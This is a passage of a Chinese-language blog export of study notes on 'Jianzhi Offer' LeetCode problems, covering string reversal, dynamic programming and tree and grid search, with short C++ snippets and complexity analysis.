翻转单词顺序输入一个英文句子，翻转句子中单词的顺序，但单词内字符的顺序不变。为简单起见，标点符号和普通字母一样处理。例如输入字符串”I am a student. “，则输出”student. a am I”。 输入: “ hello world! “输出: “world! hello”解释: 输入字符串可以在前面或者后面包含多余的空格，但是反转后的字符不能包括。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/fan-zhuan-dan-ci-shun-xu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解从后往前遍历，用一个指针指向非空格字符，向左移动找到第一个空格字符，两个指针界定一个单词，加入结果字符串中。 12345if(s[i]!=' ')&#123; int j=i;while(i&gt;=0 &amp;&amp; s[i]!=' ') --i;res+=substr(i+1,j-i); 复杂度一次遍历，时间复杂度O(n)，需要用一个字符串储存结果，空间复杂度O(n)","comments":true,"tags":[{"name":"剑指offer","slug":"剑指offer","permalink":"http://yoursite.com/tags/剑指offer/"}]},{"title":"剑指 Offer. 动态规划","date":"2022-04-23T12:42:59.000Z","path":"2022/04/23/剑指offer-动态规划/","text":"动态规划，包括10- I. 斐波那契数列，10- II. 青蛙跳台阶问题，63. 股票的最大利润，42. 连续子数组的最大和，47. 礼物的最大价值，46. 把数字翻译成字符串，48. 最长不含重复字符的子字符串，19. 正则表达式匹配，49. 丑数，60. n个骰子的点数 剑指 Offer 10- I. 斐波那契数列写一个函数，输入 n ，求斐波那契（Fibonacci）数列的第 n 项（即 F(N)）。 斐波那契数列的定义如下： F(0) = 0, F(1) = 1F(N) = F(N - 1) + F(N - 2), 其中 N &gt; 1. 答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。 0 &lt;= n &lt;= 100 题解1、递归，代码简单但效率不够，n=100时已经爆栈。 2、迭代，用两个变量记录F(N - 1) 和F(N - 2) ，计算出下一个值F(N)后，两个变量向后移动，类似滑动数组的方法。也可以理解为动态规划 123temp=j;j=(i+j)%1000000007; i=temp; //向后滑动 复杂度循环n次，时间复杂度O(n)，空间复杂度O(1) 剑指 Offer 10- II. 青蛙跳台阶问题一只青蛙一次可以跳上1级台阶，也可以跳上2级台阶。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。 答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。 输入：n = 2输出：2 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/qing-wa-tiao-tai-jie-wen-ti-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解动态规划关键是找递推公式，跳一级台阶后剩下的跳法数目为f(n-1)，跳两级台阶后剩下的跳法数目为f(n-2)，于是得到递推公式f(n)=f(n-1)+f(n-2) 该公式和斐波那契数列相同，区别在于初始两个数不同，模板如下： 12345678910if(n==0 || n==1) return 1; //前两项int i=1,j=1;int temp;for(int k=2;k&lt;=n;k++)&#123; //后n-2项 temp=j; j=(i+j)%1000000007; i=temp;&#125;return j; 1、先判断前两个数 2、给前两项赋初值，进入for迭代计算下一项 注意k从2开始且k&lt;=n，因为是从第0项开始的，0-n。除去前两项，故从2到n，包括n。 剑指 Offer 63. 股票的最大利润假设把某股票的价格按照时间先后顺序存储在数组中，请问买卖该股票一次可能获得的最大利润是多少？ 输入: [7,1,5,3,6,4]输出: 5解释: 在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/gu-piao-de-zui-da-li-run-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解动态规划问题，此题有两个变量值得注意，一个是要求的最大利润，一个是（当前的）最小价格。显然，我们应当在最小价格时买入，然后计算最大利润，当遇到更小的价格时更新最小价格，同样地计算最大利润。 12min_price=min(min_price,prices[i]);max_profit=max(max_profit,prices[i]-min_price); 最小价格的更新很简单，检查当前价格是否更小即可 最大利润的更新看当前价格卖出时的利润是否大于最大利润，是则更新它，否则不变。 复杂度一次遍历，时间复杂度O(n)，空间复杂度O(1) 易错点第一次坐时执着于dp[i]的表示，其实用变量max_profit即可。 剑指 Offer 42. 连续子数组的最大和输入一个整型数组，数组中的一个或连续多个整数组成一个子数组。求所有子数组的和的最大值。 要求时间复杂度为O(n)。 输入: nums = [-2,1,-3,4,-1,2,1,-5,4]输出: 6解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/lian-xu-zi-shu-zu-de-zui-da-he-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解本题的重点在于找起点，即从哪个地方重新开始。 应该从较大的数开始，这个数的值比此前的最大子数组和还要大，即num[i] &gt; nums[i]+f(i-1)，也就是说此前的最大子数组和f(i-1)是副作用，直接舍弃，从nums[i]重新开始 于是我们有状态转移方程f(i)=max(f(i-1)+nums[i], nums[i]) 用cur存子数组和，max_res更新结果。 12cur=max(cur+nums[i],nums[i]);max_res=max(max_res,cur); 复杂度一次遍历，时间复杂度O(n)，空间复杂度O(1) 剑指 Offer 47. 礼物的最大价值在一个 m*n 的棋盘的每一格都放有一个礼物，每个礼物都有一定的价值（价值大于 0）。你可以从棋盘的左上角开始拿格子里的礼物，并每次向右或者向下移动一格、直到到达棋盘的右下角。给定一个棋盘及其上面的礼物的价值，请计算你最多能拿到多少价值的礼物？ 输入:[ [1,3,1], [1,5,1], [4,2,1]]输出: 12解释: 路径 1→3→5→2→1 可以拿到最多价值的礼物 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/li-wu-de-zui-da-jie-zhi-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解对于位置(i,j)，要在此处拿到最大值取决于它上面和左边的格子能拿到的最大值即max((i-1,j)，(i,j-1)) 这两个格子又取决于它们上左两个格子，于是有状态转移方程dp(i,j)=max(dp(i-1,j),dp(i,j-1))+grid(i,j) 另外考虑边界： i=0，j=0时，没有上左两格，dp(i,j)=grid(i,j) i=0，j≠0时，只能左右移动，dp(i,j)=grid(i,j)+dp(i,j-1) i≠0，j=0时，只能上下移动，dp(i,j)=grid(i,j)+dp(i-1,j) 123456789101112for(int i=0;i&lt;M;++i)&#123; for(int j=0;j&lt;N;++j)&#123; if(i==0 &amp;&amp; j==0) grid[i][j]=grid[i][j]; //起点没有上一步 else if(i==0) grid[i][j]=grid[i][j]+grid[i][j-1]; else if(j==0) grid[i][j]=grid[i][j]+grid[i-1][j]; else grid[i][j]=grid[i][j]+max(grid[i-1][j],grid[i][j-1]); &#125;&#125; 因为每个格子只更新一次，可直接使用grid作为dp，避免额外空间使用。 复杂度遍历每个格子，时间复杂度O(M*N)，空间复杂度O(1) 剑指 Offer 46. 把数字翻译成字符串给定一个数字，我们按照如下规则把它翻译为字符串：0 翻译成 “a” ，1 翻译成 “b”，……，11 翻译成 “l”，……，25 翻译成 “z”。一个数字可能有多个翻译。请编程实现一个函数，用来计算一个数字有多少种不同的翻译方法。 输入: 12258输出: 5解释: 12258有5种不同的翻译，分别是”bccfi”, “bwfi”, “bczi”, “mcfi”和”mzi” 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/ba-shu-zi-fan-yi-cheng-zi-fu-chuan-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解数的翻译可以分为3种情况 1、小于10，只有一种翻译法 2、大于25，翻译个位 3、10~25之间，有两种翻译法，翻译个位或整体共同翻译 所以我们可以每次取两位数，判断它是否处于10到25之间，可以用递归实现这一方法，因为从后往前的翻译方法数目相同。 1234567if(num&lt;10) return 1; //产生一种翻译方法int m=num%100; //取两位数if(m&gt;=10 &amp;&amp; m&lt;=25) return translateNum(num/10)+translateNum(num/100); //能翻译两位else return translateNum(num/10); //只能翻译一位 除此之外还可以动态规划 dp[i]代表以xi结尾的字符串的翻译方法数，单独翻译xi时dp[i]=dp[i-1]，若xi和它前一位可以共同翻译时，就多了一种翻译法，此时dp[i]=dp[i-1]+d[i-2] 题目转化为了青蛙跳台阶，但区别在于dp[i]=dp[i-1]+d[i-2]是有条件的。 依然是动态规划模板，无数字方法数为1，一个数字翻译方法数为1，初始化dp[0]=1,dp[1]=1 12345678910int i=1,j=1,temp;for(int k=2;k&lt;=str.size();++k)&#123; if(str.substr(k-2,2)&gt;=\"10\" &amp;&amp; str.substr(k-2,2)&lt;=\"25\") temp=i+j; //满足条件则滚动 else temp=j; i=j; j=temp;&#125;return j; 为减少空间使用，用i，j滚动记录dp[i-1]和d[i-2] 复杂度动态规划：时间复杂度O(n)，需要用字符串储存数字，空间复杂度O(n) 剑指 Offer 48. 最长不含重复字符的子字符串请从字符串中找出一个最长的不包含重复字符的子字符串，计算该最长子字符串的长度。 输入: “abcabcbb”输出: 3解释: 因为无重复字符的最长子串是 “abc”，所以其长度为 3。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/zui-chang-bu-han-zhong-fu-zi-fu-de-zi-zi-fu-chuan-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、一种很直观的思路是：从第一个个字符开始向后遍历，查看是否是重复字符，不是则加入到子串，是则停止然后计算该子串的长度，然后从下一个字符开始。最终比较得出最长的子串 我们需要一个数据结构来完成“是否有重复字符”这一功能，在c++中unordered_set符合需求。 i表示左指针的位置，right表示右指针的位置，注意right初值为i，所以第一次insert时相当于是加入了左指针，因此最后计算长度为right加1的次数就为子串的长度，用right-i计算。 1234567if(i!=0) set.erase(s[i-1]); //更换左指针while(right&lt;s.size() &amp;&amp; !set.count(s[right]))&#123; set.insert(s[right]); //右指针后移 ++right;&#125;res=max(res,right-i); 2、动态规划，由于目前不熟悉哈希表的操作，以后补充 复杂度时间复杂度O(n)，空间复杂度O(1) 易错点边界问题需要注意，right的初值可取-1或0，这样子串长度的计算也不同。 剑指 Offer 19. 正则表达式匹配请实现一个函数用来匹配包含’. ‘和’*‘的正则表达式。模式中的字符’.’表示任意一个字符，而’*‘表示它前面的字符可以出现任意次（含0次）。在本题中，匹配是指字符串的所有字符匹配整个模式。例如，字符串”aaa”与模式”a.a”和”ab*ac*a”匹配，但与”aa.a”和”ab*a”均不匹配。 输入:s = “ab”p = “.“输出: true解释: “.“ 表示可匹配零个或多个（’*’）任意字符（’.’）。 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/zheng-ze-biao-da-shi-pi-pei-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解这也能动态规划系列… 用二维数组表示match[i] [j]表示前s的前i个字符和p的前j个字符的匹配情况。 1、空串匹配：s、p都空才匹配 2、p不是*，看i - 1和j - 1是否匹配（j - 1为.必能匹配），若匹配match[i] [j] = match[i - 1] [j - 1] 也就是当前已匹配，整体看之前的匹配情况。不匹配则整体失败，默认0 3、p遇到，看\\的前一个字符即j - 2和i - 1是否匹配，若匹配match[i] [j] = match[i - 1] [j]; 也就是看s的前一个字符匹配情况，因为*前面的字符可以出现任意次，所有p不动，只看s 若不匹配，不能说整体失败，因为*可以让它前面的字符无效，只需移动，p的\\和它前面的字符都没能匹配，p前移2位，match[i] [j] |= match[i - 1] [j]; 复杂度两重for，时间复杂度O(mn)，需要match数组，空间复杂度O(mn) 易错点想不出来 剑指 Offer 49. 丑数我们把只包含质因子 2、3 和 5 的数称作丑数（Ugly Number）。求按从小到大的顺序的第 n 个丑数。 输入: n = 10输出: 12解释: 1, 2, 3, 4, 5, 6, 8, 9, 10, 12 是前 10 个丑数。 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/chou-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解丑数就是把1、2、3、5这几个数组合相乘，第n个丑数就是所有结果从小到大的第n个数 每次从已知结果中选出两个数相乘得到不重复的最小数，大问题分解为子问题，动态规划。 任意一个丑数都是由小于它的某一个丑数*2，*3或者*5得到的 可以在丑数数组中设置3个指针，指到的丑数2，\\3或者*5，把其中的最小值加入数组中，将3种系数分置成指针，只有参与计算的指针才后移，可以避免重复计算丑数。 12345678910for(int cnt = 1; cnt &lt; n; ++cnt)&#123; int cur = min(dp[i] * 2, min(dp[j] * 3, dp[k] * 5)); if(cur == dp[i] * 2) ++i; if(cur == dp[j] * 3) ++j; if(cur == dp[k] * 5) ++k; dp[cnt] == cur;&#125; 复杂度时间复杂度O(n)，空间复杂度O(n) 剑指 Offer 60. n个骰子的点数把n个骰子扔在地上，所有骰子朝上一面的点数之和为s。输入n，打印出s的所有可能的值出现的概率。 你需要用一个浮点数数组返回答案，其中第 i 个元素代表这 n 个骰子所能掷出的点数集合中第 i 小的那个的概率。 输入: 2输出: [0.02778,0.05556,0.08333,0.11111,0.13889,0.16667,0.13889,0.11111,0.08333,0.05556,0.02778] 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/nge-tou-zi-de-dian-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解dp[i] [j]表示投掷完i枚骰子后，点数j的出现次数 递推公式dp[i] [j] = dp[i - 1] [j - k]; k为当前骰子的点数 123456789for(int i = 2; i &lt;= n; ++i)&#123; //投第i个骰子 for(int j = i; j &lt;= i * 6; ++j)&#123; //i个骰子可能的点数和 for(int k = 1; k &lt;= 6; ++k)&#123; //当前骰子的点数 if(j - k &lt;= 0) break; dp[i][j] += dp[i - 1][j - k]; &#125; &#125;&#125; 复杂度时间复杂度O(n^2)，空间复杂度O(n^2) 易错点看不懂它的优化…","comments":true,"tags":[{"name":"剑指offer","slug":"剑指offer","permalink":"http://yoursite.com/tags/剑指offer/"}]},{"title":"剑指 Offer. 搜索与回溯算法","date":"2022-04-21T09:16:29.000Z","path":"2022/04/21/剑指offer-搜索与回溯算法/","text":"搜索与回溯算法，包括32 - I. 从上到下打印二叉树，32 - II. 从上到下打印二叉树 II，32 - III. 从上到下打印二叉树 III，26. 树的子结构，27. 二叉树的镜像，28. 对称的二叉树，12. 矩阵中的路径，13. 机器人的运动范围，54. 二叉搜索树的第k大节点，34. 二叉树中和为某一值的路径，36. 二叉搜索树与双向链表，55 - I. 二叉树的深度，55 - II. 平衡二叉树，64. 求1+2+…+n，68 - I. 二叉搜索树的最近公共祖先，68 - II. 二叉树的最近公共祖先，37. 序列化二叉树，38. 字符串的排列 剑指 Offer 32 - I. 从上到下打印二叉树从上到下打印出二叉树的每个节点，同一层的节点按照从左到右的顺序打印。 例如:给定二叉树: [3,9,20,null,null,15,7]，返回[3,9,20,15,7] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/cong-shang-dao-xia-da-yin-er-cha-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解用队列实现二叉树的层序遍历 复杂度时间复杂度O(n)，空间复杂度O(n) 剑指 Offer 32 - II. 从上到下打印二叉树 II从上到下按层打印二叉树，同一层的节点按从左到右的顺序打印，每一层打印到一行。 例如:给定二叉树: [3,9,20,null,null,15,7],返回其层次遍历结果： [ [3], [9,20], [15,7]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/cong-shang-dao-xia-da-yin-er-cha-shu-ii-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解同层输出，需要设法标识每一层的节点。 可以在处理每一层之前先计算当前队列的长度，该长度就是同层节点的数目，记录下这个长度，把这些节点的值存入一个数组中。下一次处理队列时重复此方法，用队列的长度指示每一层节点的数目。 在新数组存元素的方法可以学一下： 12res.push_back(vector&lt;int&gt; ());res.back().push_back(cur-&gt;val); 复杂度时间复杂度O(n)，空间复杂度O(n) 剑指 Offer 32 - III. 从上到下打印二叉树 III请实现一个函数按照之字形顺序打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右到左的顺序打印，第三行再按照从左到右的顺序打印，其他行以此类推。 给定二叉树: [3,9,20,null,null,15,7],返回其层次遍历结果： [ [3], [20,9], [15,7]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/cong-shang-dao-xia-da-yin-er-cha-shu-iii-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解用一个变量flag区分奇偶数行，偶数行先存到栈里，存完后再输出到结果数组中。 复杂度时间复杂度O(n)，空间复杂度O(n) 剑指 Offer 26. 树的子结构输入两棵二叉树A和B，判断B是不是A的子结构。(约定空树不是任意一个树的子结构) B是A的子结构， 即 A中有出现和B相同的结构和节点值。 输入：A = [1,2,3], B = [3,1]输出：false 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shu-de-zi-jie-gou-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解两棵树比较的题目，一般需要用递归遍历地比较每个节点。 判断是否存在子结构： 1、若当前节点值相同，递归地比较左右节点值，若一直相同，直到B到空节点了，说明有子结构 2、若当前节点值不同，说明从此处开始没有子结构，再从A的左右子树开始，重复和B的比较 可见存在两个递归，第一个是递归地比较节点值是否相同，第二个是把A的每个节点都和B进行一次第一种递归。 12return (A-&gt;val==B-&gt;val) &amp;&amp; isSame(A-&gt;left,B-&gt;left) &amp;&amp; isSame(A-&gt;right,B-&gt;right);//结构相同的条件：当前值相等、左右子节点也相同 （第一个递归） 12return isSame(A,B) || isSubStructure(A-&gt;left,B) || isSubStructure(A-&gt;right,B);//存在子结构的条件：A、B节点开始存在子结构，或剩下的其中一个节点存在子结构。 （第二个递归） 复杂度A的每个节点都要和B进行一次子结构的比较，时间复杂度为O(MN)，其中 M,N分别为树 A 和 树 B的节点数量 A退化为链表时，需要M的递归栈，空间复杂度O(M) 易错点1、结束比较的条件，B=nullptr说明B以越过叶节点，返回true， 再接上A=nullptr说明B非空时A以空，返回false。当比较过程中其中一个节点值不同时也返回false，即上述第一个递归 2、需要两个函数，否则无法判断B=nullptr时的情况，因为如果输入的B就为空，当然应该返回false，但后续的比较中若B=nullptr又应该返回true，相互矛盾故无法用一个函数实现。 3、第二个递归比较A的左右子树和B是用isSubStructure而不是isSame，因为这是找其他子结构的过程。 剑指 Offer 27. 二叉树的镜像请完成一个函数，输入一个二叉树，该函数输出它的镜像。 例如输入： ​ 4 / \\ 2 7 / \\ / \\1 3 6 9镜像输出： ​ 4 / \\ 7 2 / \\ / \\9 6 3 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/er-cha-shu-de-jing-xiang-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解交换根节点的左右节点，然后向下递归交换每个子节点的左右节点。 复杂度时间复杂度O(n)，空间复杂度O(n) 易错点1、空节点nullptr和非空节点可以一视同仁地进行交换，不需要区分。第一次写时写成如下形式： 12345678910if(root-&gt;left==nullptr)&#123; root-&gt;left=root-&gt;right; root-&gt;right=nullptr; mirrorTree(root-&gt;left);&#125;if(root-&gt;right==nullptr)&#123; root-&gt;right=root-&gt;left; root-&gt;left=nullptr; mirrorTree(root-&gt;right);&#125; 初看似乎也没问题，但遇到[1,null,2]就出错，后来发现执行完第一个if后right为nullptr，递归回来后又会进入第二个if，把左右节点交换回来。其实无需判断空节点，直接交换即可 12345TreeNode* temp=root-&gt;right; //交换左右节点root-&gt;right=root-&gt;left;root-&gt;left=temp;mirrorTree(root-&gt;left); //向下递归反转mirrorTree(root-&gt;right); 2、此方法修改了原树的结构，若要另外建新的树，参考lc的官解。 3、也可以不用递归，用队列层序遍历，节点入队后交换它的左右节点。 剑指 Offer 28. 对称的二叉树请实现一个函数，用来判断一棵二叉树是不是对称的。如果一棵二叉树和它的镜像一样，那么它是对称的。 例如，二叉树 [1,2,2,3,4,4,3] 是对称的。 ​ 1 / \\ 2 2 / \\ / \\3 4 4 3 但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的: ​ 1 / \\ 2 2 \\ \\ 3 3 题解此题可与“树的子结构”类比，都是递归地进行树的比较。 区别在于对称是A树的左节点和B树的右节点比较，子结构是A树的左节点和B树的左节点比较， 同时对称不用对每个子节点都进行检查，只需对根节点的左右子节点比较即可。 同样的，递归类的题可以用队列改为非递归方法，方法是同时把root入队两次，然后每次取两个节点的左右节点进行比较。 复杂度时间复杂度O(n)，空间复杂度O(n) 剑指 Offer 12. 矩阵中的路径给定一个 m x n二维字符网格 board和一个字符串单词 word。如果 word 存在于网格中，返回 true；否则，返回false 。 单词必须按照字母顺序，通过相邻的单元格内的字母构成，其中“相邻”单元格是那些水平相邻或垂直相邻的单元格。同一个单元格内的字母不允许被重复使用。 输入：board = [[“A”,”B”,”C”,”E”],[“S”,”F”,”C”,”S”],[“A”,”D”,”E”,”E”]], word = “ABCCED”输出：true 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/ju-zhen-zhong-de-lu-jing-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解搜索问题，若遍历所有路径非常耗时，在搜索时需要进行剪枝，即发现一个字符不匹配时立刻停止搜索。 至于是否剪枝的判断，有几种情况需要结束搜索：越界、字母不匹配 把边界判断打包在一起，每次查找时就不用单独做判断了 另外当查找完最后一个字符结束判断。 1234if(i&gt;=M || i&lt;0 || j&gt;=N || j&lt;0 || board[i][j]!=word[k]) //剪枝的几种情况 return false;if(k==word.size()-1) //最后一个字符查找成功 return true; 为了避免同一个单元格内的字母不允许被重复使用，每次到一个网格时将字母设置为空，等返回再复原 然后递归地在四个方向查找 1234board[i][j]='\\0'; //标记为已访问bool res=dfs(board,word,i+1,j,k+1) || dfs(board,word,i,j+1,k+1) || dfs(board,word,i-1,j,k+1) || dfs(board,word,i,j-1,k+1);//上下左右四个方向查找board[i][j]=word[k]; //还原，避免影响下一趟查找 在exist函数中，分别从每个节点开始搜索 复杂度每次搜索有四个方向，其中一个是原方向，因此有3中选择长为k的word，进行3^k次查找，每个节点都要开始一次搜索，时间复杂度为O((3^k)MN)。 递归栈深度为k，空间复杂度O(k) 剑指 Offer 13. 机器人的运动范围地上有一个m行n列的方格，从坐标 [0,0] 到坐标 [m-1,n-1] 。一个机器人从坐标 [0, 0] 的格子开始移动，它每次可以向左、右、上、下移动一格（不能移动到方格外），也不能进入行坐标和列坐标的数位之和大于k的格子。例如，当k为18时，机器人能够进入方格 [35, 37] ，因为3+5+3+7=18。但它不能进入方格 [35, 38]，因为3+5+3+8=19。请问该机器人能够到达多少个格子？ 输入：m = 2, n = 3, k = 1输出：3 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/ji-qi-ren-de-yun-dong-fan-wei-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解和“矩阵中的路径”相似都是搜索符合要求的网格，若不符合则剪枝停止搜索 sum函数用于计算两个数的位数和，visited矩阵用于记录是否已访问，每次成功访问则标记为1 然后计数加1，并向右和向下遍历 1234if(i&gt;=m || j&gt;=n || visited[i][j]==1 || sum(i,j)&gt;k) //遇到障碍 return 0;visited[i][j]=1; //标记为已访问return 1+dfs(i+1,j,m,n,k,visited)+dfs(i,j+1,m,n,k,visited); //继续向后查找 复杂度遍历一遍矩阵，时间复杂度O(MN) 需要visited矩阵，空间复杂度O(MN) 易错点1、一开始直接遍历整个矩阵，看是否符合位数和小于k的条件，但出错。因为本题是一个搜索问题，在符合要求的节点之间存在不符合的“障碍”节点，导致一些节点其实是不可达的，不能计算在内。因此我们需要一步一步地搜索，而不是直接查所有节点。 剑指 Offer 54. 二叉搜索树的第k大节点给定一棵二叉搜索树，请找出其中第 k大的节点的值。 输入: root = [5,3,6,2,4,null,null,1], k = 3 5 / \\ 3 6 / \\ 2 4 / 1输出: 4 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/er-cha-sou-suo-shu-de-di-kda-jie-dian-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解二叉搜索树且和大小顺序有关的题目，考虑中序遍历 最简单的方法是中序遍历得到有序数组，然后直接找倒数第k个元素即可，但此法需要额外的空间 应该设法在原二叉树上遍历时就完成查找，很容易想到遍历时加一个标记 可以从右到左逆中序遍历，这样就会从大元素到小元素，找第k个元素即可。 123456inorder(root-&gt;right); //从右向左的中序遍历if(--count==0)&#123; res=root-&gt;val; //找到第k大的节点，储存在res中 return;&#125;inorder(root-&gt;left); 复杂度时间复杂度O(n)，递归用栈，空间复杂度O(logn) 易错点1、注意到上面的if判断用的全局变量count而不是k，若用k，中序遍历要写作inorder(TreeNode* root,int&amp; k)，否则递归时k传值并不会返回修改后的k。写递归时若参数列表有变化都应该注意这一点。 2、中序的左右顺序变一下就有不同效果，不要死板。 剑指 Offer 34. 二叉树中和为某一值的路径给你二叉树的根节点 root 和一个整数目标和 targetSum ，找出所有 从根节点到叶子节点 路径总和等于给定目标和的路径。 叶子节点 是指没有子节点的节点。 输入：root = [5,4,8,11,null,13,4,7,2,null,null,5,1], targetSum = 22输出：[[5,4,11,2],[5,8,4,5]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/er-cha-shu-zhong-he-wei-mou-yi-zhi-de-lu-jing-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解思路不难，无非就是找每个节点，若组成了target则得到一条路径，怎么用代码实现？ 首先，用dfs遍历每个节点，三种顺序的遍历均可，查找的过程需要回溯，因此需要用递归 可能有多条路径，由于递归会一直向下进行，不用担心不同路径的混淆，用一个path数组存储当前路径，当符合题意后再把路径加入到结果res中 另外，一个技巧是每次到一个节点对target用减法而不是计算路径和，这样可以少一个变量 1234567path.push_back(root-&gt;val); target-=root-&gt;val; //先加入当前节点，并计算剩余需要的数if(root-&gt;left==nullptr &amp;&amp; root-&gt;right==nullptr &amp;&amp; target==0)res.push_back(path); //得到一条符合题意的路径dfs(root-&gt;left,target);dfs(root-&gt;right,target);path.pop_back(); //回溯，删除当前节点 复杂度遍历每个节点，时间复杂度O(n)，递归栈，空间复杂度O(n) 易错点一开始不知道怎么表示“当前路径”和“全部结果”，活用全局变量，不一定要在函数参数列表中表示。 对回溯的实现也要熟练。 剑指 Offer 36. 二叉搜索树与双向链表输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。 我们希望将这个二叉搜索树转化为双向循环链表。链表中的每个节点都有一个前驱和后继指针。对于双向循环链表，第一个节点的前驱是最后一个节点，最后一个节点的后继是第一个节点。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/er-cha-sou-suo-shu-yu-shuang-xiang-lian-biao-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解链表改双向链表不难，但此题是在二叉树上操作 二叉搜索树，并且和顺序有关，立刻想到中序遍历，中序遍历二叉树的过程相当于处理一个链表 可以在遍历左右节点的操作之间进行链表的双向化，显然需要一个pre节点辅助 123456if(pre==nullptr) //root是第一个节点，没有pre head=root;else pre-&gt;right=root;root-&gt;left=pre; //前后节点的链接pre=root; //pre向后移动 root会移动，第一次处理时用head保存。 pre，root相互指向 复杂度一次遍历，时间复杂度O(n)，递归栈，空间复杂度O(n) 剑指 Offer 55 - I. 二叉树的深度输入一棵二叉树的根节点，求该树的深度。从根节点到叶节点依次经过的节点（含根、叶节点）形成树的一条路径，最长路径的长度为树的深度。 ​ 3 / \\ 9 20 / \\ 15 7返回它的最大深度 3 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/er-cha-shu-de-shen-du-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解递归找左右最大深度 1return max(maxDepth(root-&gt;left),maxDepth(root-&gt;right)) + 1; 复杂度遍历每个节点，时间复杂度O(n) 递归栈，空间复杂度O(n) 剑指 Offer 55 - II. 平衡二叉树输入一棵二叉树的根节点，判断该树是不是平衡二叉树。如果某二叉树中任意节点的左右子树的深度相差不超过1，那么它就是一棵平衡二叉树。 1 / \\ 2 2/ \\ 3 3 / \\ 4 4 返回false 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/ping-heng-er-cha-shu-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解1、使用上一题的方法，对每个节点求左右深度差，但包含了大量重复计算，时间复杂度高 2、自底向上，若发现失衡则剪枝避免继续计算 还是类似上一题的递归求深度，但不再直接返回深度，而是加入判断 12if(abs(left - right) &gt; 1) return -1; 用返回值-1表示已失衡，每次求左右子树的深度left和right，判断它们是否失衡，若等于-1，则直接向上返回-1，不再计算该节点左右深度差。 复杂度时间复杂度O(n)，空间复杂度O(n) 易错点难在剪枝的方法，left和right分开计算判断是否需剪枝。 剑指 Offer 64. 求1+2+…+n求 1+2+…+n ，要求不能使用乘除法、for、while、if、else、switch、case等关键字及条件判断语句（A?B:C）。 输入: n = 3输出: 6 题解若不做限制可以递归，但不能if导致递归缺少出口 考虑&amp;&amp;操作的短路特性，当n=0时，不会执行后面的语句，递归停止。 12n &amp;&amp; (n += sumNums(n - 1)); //n &amp;&amp; .. 起到开关作用return n; 复杂度时间复杂度O(n)，空间复杂度O(n) 剑指 Offer 68 - I. 二叉搜索树的最近公共祖先给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。 输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8输出: 6解释: 节点 2 和节点 8 的最近公共祖先是 6。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/er-cha-sou-suo-shu-de-zui-jin-gong-gong-zu-xian-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 题解最近公共祖先问题有很多算法， 本题有一个特别之处是给定的树为二叉搜索树，可以利用二叉搜索树左小右大的特点。 对于两个节点： 1、若它们分别分布在一个节点的左子树和右子树，则该节点就是公共祖先 2、若它们分布在同一侧，公共祖先也在那一侧 12345if(p-&gt;val &gt; root-&gt;val &amp;&amp; q-&gt;val &gt; root-&gt;val) return lowestCommonAncestor(root-&gt;right, p, 